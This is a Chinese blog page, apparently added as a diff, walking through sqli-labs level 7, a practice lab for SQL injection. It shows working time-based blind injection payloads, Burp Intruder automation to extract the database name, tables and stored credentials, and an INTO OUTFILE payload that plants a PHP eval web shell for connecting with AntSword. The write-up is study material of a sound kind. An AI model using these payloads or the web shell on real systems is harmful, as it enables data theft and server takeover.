@@ -1,0 +1,88 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="a首先还是查找注入点，当我们输入1‘的时候，发现报错，但是当我们在后面添加%23时依然报错，说明这个地方还是没有闭合，按我们继续尝试加东西。 我们在’后面加）一个不够再加一个，发现回显正常。  ?id&#x3D;-1’ union select 1,@@datadir,@@basedir%23在第一关中查出数据库的位置信息（没办法，第七关一点反应没有，小子无能查不出来）  然后通过 先帝创业未办而">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLI-DUMB-SERIES-7">
+<meta property="og:url" content="http://example.com/2022/03/28/SQLI-DUMB-SERIES-7/index.html">
+<meta property="og:site_name" content="懒大王的主场">
+<meta property="og:description" content="a首先还是查找注入点，当我们输入1‘的时候，发现报错，但是当我们在后面添加%23时依然报错，说明这个地方还是没有闭合，按我们继续尝试加东西。 我们在’后面加）一个不够再加一个，发现回显正常。  ?id&#x3D;-1’ union select 1,@@datadir,@@basedir%23在第一关中查出数据库的位置信息（没办法，第七关一点反应没有，小子无能查不出来）  然后通过 先帝创业未办而">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h0qf9lmdx7j30nm0aq3zm.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/008gHraJly8h0qfo37i0cj30kr08bgmb.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008gHraJly8h0rnz109umj30k504ijrw.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/008gHraJly8h0ro3h13h4j30kr05n3z2.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h0rnur2k8yj30vr0o1q8y.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008gHraJly8h0ropygqo5j30qd09t3zn.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h0roqe9qtcj318j0jqtbi.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008gHraJly8h0ropa3f2nj30pj0ckmy7.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008gHraJly8h0rq0nyojmj31590b576c.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/008gHraJly8h0vnk7j26bj31150cvdhx.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h0vnmct0g4j30om08ut97.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/008gHraJly8h0vnri34y3j30gj0d7dgj.jpg">
+<meta property="article:published_time" content="2022-03-28T10:53:27.000Z">
+<meta property="article:modified_time" content="2022-04-02T12:43:28.892Z">
+<meta property="article:author" content="Sanyer">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="时间盲注">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva2.sinaimg.cn/large/008gHraJly8h0qf9lmdx7j30nm0aq3zm.jpg"><title>SQLI-DUMB-SERIES-7 | 懒大王的主场</title><link ref="canonical" href="http://example.com/2022/03/28/SQLI-DUMB-SERIES-7/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">懒大王的主场</div><div class="header-banner-info__subtitle">懒大王专场，舔羊勿进</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">SQLI-DUMB-SERIES-7</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-28</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-02</span></span></div></header><div class="post-body"><p>a首先还是查找注入点，当我们输入1‘的时候，发现报错，但是当我们在后面添加%23时依然报错，说明这个地方还是没有闭合，按我们继续尝试加东西。</p>
+<p>我们在’后面加）一个不够再加一个，发现回显正常。</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0qf9lmdx7j30nm0aq3zm.jpg" alt="img"></p>
+<p>?id&#x3D;-1’ union select 1,@@datadir,@@basedir%23在第一关中查出数据库的位置信息（没办法，第七关一点反应没有，小子无能查不出来）</p>
+<p><img src="https://tva4.sinaimg.cn/large/008gHraJly8h0qfo37i0cj30kr08bgmb.jpg" alt="img"></p>
+<p>然后通过</p>
+<p>先帝创业未办而中道崩殂，今日我文件导不出去而直接gg。好吧，我们只能选择时间盲注QAQ</p>
+<p>?id&#x3D;1%27))%20and%20if%20((length(database())%3E0),sleep(5),1)%23</p>
+<p>当我们输入这串代码时，我们放心网页在五秒后才停止转动小圆圈、说明我们的时间盲注可用</p>
+<p>?id&#x3D;1%27))%20and%20if%20((ascii(substr(database(),1,1))%3E150),sleep(5),1)%23我们先纯手工找一下database的第一个字母是什么，然后再利用burpsuite提升一下效率</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0rnz109umj30k504ijrw.jpg" alt="img"></p>
+<p>发现当我们输入大于150时，没有延迟。所以第一个字母的ascii码小于150，我们逐步进行范围缩小最后确定最后发现其ascii码为115对应字母为s</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0ro3h13h4j30kr05n3z2.jpg" alt="img"></p>
+<p>然后我们开始抓包，抓到包后点击右键，Send to intruder。</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0rnur2k8yj30vr0o1q8y.jpg" alt="img"></p>
+<p>在Intruder时，先点击Clear § 然后选中我们sql语句中的条件（现在是115），然后add。 之后更改我们要查的字母位置</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0ropygqo5j30qd09t3zn.jpg" alt="img"></p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0roqe9qtcj318j0jqtbi.jpg" alt="img"></p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0ropa3f2nj30pj0ckmy7.jpg" alt="img"></p>
+<p>我们得出结果第二个字母是e</p>
+<p>跑出数据库名security</p>
+<p> if ((substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;’e’,sleep(5),1)%23</p>
+<p>跑出第一个数据表的第一个字母为e</p>
+<p>用burpsuite查出表面是emails不是我们需要的表，更改limit 直到limit3，1的时候我们找到了users表</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0rq0nyojmj31590b576c.jpg" alt="img"></p>
+<p>我们继续变化找出列名为id,username,password</p>
+<p>后续继续得出第一个id&#x3D;1 username&#x3D;Dumb password&#x3D;Dumb</p>
+<p>方法二：outfile </p>
+<p>由于靶场的数据库权限没开，只能自己搭了一个本地环境</p>
+<p>前面查注入点方法相同</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://localhost/sqli-labs/Less-1/?id=1&#39;" >http://localhost/sqli-labs/Less-1/?id=1&#39;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> union select 1,2,’<?php @eval($_POST["123"])?>‘ into outfile “D:&#x2F;&#x2F;phpstudy_pro&#x2F;&#x2F;WWW&#x2F;&#x2F;sqli-labs&#x2F;&#x2F;Less-1&#x2F;&#x2F;test1.php”%23</p>
+<p>在这里，为什么使用的是&#x2F;&#x2F;因为\会被过滤掉</p>
+<p><img src="https://tva3.sinaimg.cn/large/008gHraJly8h0vnk7j26bj31150cvdhx.jpg" alt="img"></p>
+<p>我们访问我们写的那个php网页，发现存在</p>
+<p><img src="https://tva2.sinaimg.cn/large/008gHraJly8h0vnmct0g4j30om08ut97.jpg" alt="img"></p>
+<p>打开中国蚁剑，输入地址</p>
+<p><img src="https://tva1.sinaimg.cn/large/008gHraJly8h0vnri34y3j30gj0d7dgj.jpg" alt="img"></p>
+<p>添加之后我们就可以为所欲为了</p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://example.com/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/03/28/SQLI-DUMB-SERIES-8/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">SQLI-DUMB-SERIES-8</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/03/28/SQLI-DUMB-SERIES-6/"><span class="paginator-prev__text">SQLI-DUMB-SERIES-6</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.png" alt="avatar"></div><p class="sidebar-ov-author__text">世间本浑浊，罪与爱同歌</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">35</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">17</div><div class="sidebar-ov-state-item__name">标签</div></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Sanyer</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
